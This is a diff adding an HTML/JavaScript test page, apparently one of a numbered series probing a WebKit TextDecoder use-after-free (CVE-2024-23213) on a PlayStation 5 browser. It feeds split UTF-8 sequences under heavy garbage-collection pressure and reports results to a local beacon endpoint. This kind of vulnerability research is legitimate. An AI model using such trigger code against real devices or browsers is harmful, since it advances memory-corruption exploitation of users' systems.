@@ -1,0 +1,270 @@
+<!--
+  p690: CVE-2024-23213 -- TextDecoder streaming decode buffer confusion
+
+  CVE-2024-23213: "The issue was addressed with improved memory handling."
+  Fixed in Safari 17.3. Present in 17.0 (605.1.15). PS5 LIKELY VULNERABLE.
+
+  TextDecoder with stream:true maintains internal state across decode() calls.
+  If the internal buffer is freed/reallocated between calls (e.g., during GC),
+  the next decode() might read from freed memory. This is a different code path
+  from the Fetch body stream tested in p689.
+
+  Patterns tested:
+  A) TextDecoder stream:true with split multi-byte UTF-8 sequences
+  B) TextDecoder with very large input causing buffer reallocation
+  C) TextDecoder stream:true interleaved with GC pressure between calls
+  D) Multiple TextDecoder instances sharing underlying ICU converter
+  E) TextDecoder with fatal:true on invalid sequences near buffer boundaries
+
+  CRASH_CLASS: LOW-MODERATE (stale buffer in text decoder)
+  prior art: p601 (JS features), p689 (Fetch body lifetime)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p690</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P690-START:CVE-2024-23213-TEXTDECODER-STREAM');
+  var results = [];
+
+  // === SECTION A: Split multi-byte UTF-8 at every byte boundary ===
+  b('A:SPLIT-MULTIBYTE');
+  try {
+    // 4-byte UTF-8 sequence for U+1F600 (grinning face): F0 9F 98 80
+    var fullSeq = new Uint8Array([0xF0, 0x9F, 0x98, 0x80]);
+    var decoder = new TextDecoder('utf-8', { stream: true });
+
+    // Split at each byte boundary
+    for (var split = 1; split < 4; split++) {
+      var d = new TextDecoder('utf-8');
+      var part1 = fullSeq.slice(0, split);
+      var part2 = fullSeq.slice(split);
+
+      var r1 = d.decode(part1, { stream: true });
+      // GC between decode calls
+      for (var i = 0; i < 500; i++) new ArrayBuffer(1024);
+
+      var r2 = d.decode(part2);
+      var combined = r1 + r2;
+      var codePoint = combined.codePointAt(0);
+      b('A:SPLIT-' + split + ':cp=' + (codePoint ? codePoint.toString(16) : 'none') +
+        ',len=' + combined.length);
+
+      if (codePoint !== 0x1F600) {
+        b('A:WRONG-CP:expected=1f600,got=' + (codePoint ? codePoint.toString(16) : 'none'));
+        results.push('A:wrong-cp-split' + split);
+      }
+    }
+
+    // Also test 3-byte sequence: U+4E16 (CJK char): E4 B8 96
+    var seq3 = new Uint8Array([0xE4, 0xB8, 0x96]);
+    for (var split = 1; split < 3; split++) {
+      var d2 = new TextDecoder('utf-8');
+      var p1 = seq3.slice(0, split);
+      var p2 = seq3.slice(split);
+      var s1 = d2.decode(p1, { stream: true });
+      for (var i = 0; i < 500; i++) new ArrayBuffer(1024);
+      var s2 = d2.decode(p2);
+      var cp2 = (s1 + s2).codePointAt(0);
+      b('A:3BYTE-SPLIT-' + split + ':cp=' + (cp2 ? cp2.toString(16) : 'none'));
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+    results.push('A:err');
+  }
+
+  // === SECTION B: Large input buffer reallocation ===
+  b('B:LARGE-INPUT');
+  try {
+    var decoder2 = new TextDecoder('utf-8');
+
+    // 1MB of ASCII
+    var big = new Uint8Array(1024 * 1024);
+    for (var i = 0; i < big.length; i++) big[i] = 0x41 + (i % 26);
+
+    var result2 = decoder2.decode(big);
+    b('B:1MB-LEN:' + result2.length);
+
+    // Now decode in streaming 64KB chunks with GC between each
+    var decoder3 = new TextDecoder('utf-8');
+    var total = 0;
+    var chunkSize = 65536;
+    for (var off = 0; off < big.length; off += chunkSize) {
+      var chunk = big.slice(off, Math.min(off + chunkSize, big.length));
+      var isLast = (off + chunkSize >= big.length);
+      var decoded = decoder3.decode(chunk, { stream: !isLast });
+      total += decoded.length;
+
+      // Heavy GC between chunks
+      for (var i = 0; i < 1000; i++) new ArrayBuffer(4096);
+    }
+    b('B:STREAM-TOTAL:' + total);
+    if (total !== big.length) {
+      b('B:SIZE-MISMATCH:expected=' + big.length + ',got=' + total);
+      results.push('B:size-mismatch');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+    results.push('B:err');
+  }
+
+  // === SECTION C: Heavy GC between stream decode calls ===
+  b('C:GC-INTERLEAVED');
+  try {
+    // Create a sequence that requires streaming state: incomplete 4-byte at end
+    var chunks = [];
+    for (var i = 0; i < 20; i++) {
+      var chunk = new Uint8Array(1024);
+      for (var j = 0; j < 1024; j++) chunk[j] = 0x41 + (j % 26);
+      // End every other chunk with an incomplete 4-byte sequence
+      if (i % 2 === 0 && i < 19) {
+        chunk[1022] = 0xF0;
+        chunk[1023] = 0x9F;
+      }
+      // Start next chunk continues the sequence
+      if (i % 2 === 1) {
+        chunk[0] = 0x98;
+        chunk[1] = 0x80;
+      }
+      chunks.push(chunk);
+    }
+
+    var decoder4 = new TextDecoder('utf-8');
+    var totalChars = 0;
+    var errors = 0;
+
+    for (var i = 0; i < chunks.length; i++) {
+      var isLast = (i === chunks.length - 1);
+      try {
+        var text = decoder4.decode(chunks[i], { stream: !isLast });
+        totalChars += text.length;
+      } catch(e2) {
+        errors++;
+        b('C:CHUNK-' + i + '-ERR:' + e2.message);
+      }
+
+      // VERY heavy GC between each chunk
+      for (var g = 0; g < 2000; g++) new ArrayBuffer(2048);
+      // Also create and drop typed arrays to pressure the decoder's internal buffer area
+      for (var g = 0; g < 500; g++) {
+        var tmp = new Uint8Array(1024);
+        tmp[0] = 0xFF;
+      }
+    }
+    b('C:TOTAL-CHARS:' + totalChars + ',ERRORS:' + errors);
+  } catch(e) {
+    b('C:ERR:' + e.message);
+    results.push('C:err');
+  }
+
+  // === SECTION D: Multiple decoders sharing internal state ===
+  b('D:MULTI-DECODER');
+  try {
+    // Create many decoders for the same encoding
+    var decoders = [];
+    for (var i = 0; i < 100; i++) {
+      decoders.push(new TextDecoder('utf-8'));
+    }
+
+    // Feed each one a partial sequence
+    var partial = new Uint8Array([0xF0, 0x9F]);
+    for (var i = 0; i < decoders.length; i++) {
+      decoders[i].decode(partial, { stream: true });
+    }
+
+    // Drop half the decoders
+    for (var i = 0; i < 50; i++) decoders[i] = null;
+
+    // Heavy GC
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+
+    // Complete the remaining decoders
+    var completion = new Uint8Array([0x98, 0x80]);
+    var ok = 0;
+    var bad = 0;
+    for (var i = 50; i < decoders.length; i++) {
+      try {
+        var result = decoders[i].decode(completion);
+        var cp = result.codePointAt(0);
+        if (cp === 0x1F600) {
+          ok++;
+        } else {
+          bad++;
+          b('D:BAD-CP:decoder=' + i + ',cp=' + (cp ? cp.toString(16) : 'none'));
+        }
+      } catch(e2) {
+        bad++;
+        b('D:DECODER-' + i + '-ERR:' + e2.message);
+      }
+    }
+    b('D:OK=' + ok + ',BAD=' + bad);
+    if (bad > 0) results.push('D:corruption');
+  } catch(e) {
+    b('D:ERR:' + e.message);
+    results.push('D:err');
+  }
+
+  // === SECTION E: fatal:true on invalid sequences near boundaries ===
+  b('E:FATAL-BOUNDARY');
+  try {
+    var decoder5 = new TextDecoder('utf-8', { fatal: true });
+
+    // Valid chunk followed by invalid byte at boundary
+    var validChunk = new Uint8Array(4096);
+    for (var i = 0; i < validChunk.length; i++) validChunk[i] = 0x41;
+
+    // First call succeeds
+    var r5 = decoder5.decode(validChunk, { stream: true });
+    b('E:VALID-CHUNK:len=' + r5.length);
+
+    // GC
+    for (var i = 0; i < 2000; i++) new ArrayBuffer(1024);
+
+    // Second call starts with invalid sequence
+    var invalidChunk = new Uint8Array([0xFF, 0xFE, 0x41, 0x42]);
+    try {
+      decoder5.decode(invalidChunk);
+      b('E:NO-ERROR-ON-INVALID');
+      results.push('E:no-fatal');
+    } catch(e2) {
+      b('E:FATAL-ERROR:' + e2.message);
+      // This is EXPECTED -- fatal:true should throw on invalid input
+    }
+
+    // Test: incomplete sequence at end of fatal decoder stream
+    var decoder6 = new TextDecoder('utf-8', { fatal: true });
+    var incompleteEnd = new Uint8Array(4097);
+    for (var i = 0; i < 4096; i++) incompleteEnd[i] = 0x41;
+    incompleteEnd[4096] = 0xF0; // start of 4-byte but no continuation
+
+    decoder6.decode(incompleteEnd, { stream: true }); // should be OK (incomplete is pending)
+    b('E:INCOMPLETE-STREAM-OK');
+
+    // GC
+    for (var i = 0; i < 2000; i++) new ArrayBuffer(1024);
+
+    // Finalize without completing the sequence
+    try {
+      decoder6.decode(new Uint8Array(0)); // empty finalize -- should throw for incomplete
+      b('E:NO-FATAL-ON-INCOMPLETE-END');
+    } catch(e2) {
+      b('E:FATAL-ON-INCOMPLETE:' + e2.message);
+      // Expected
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+    results.push('E:err');
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P690-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P690-RESULT:NO-UAF-DETECTED');
+  }
+  b('P690-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p690: TextDecoder streaming decode buffer confusion</pre></body></html>
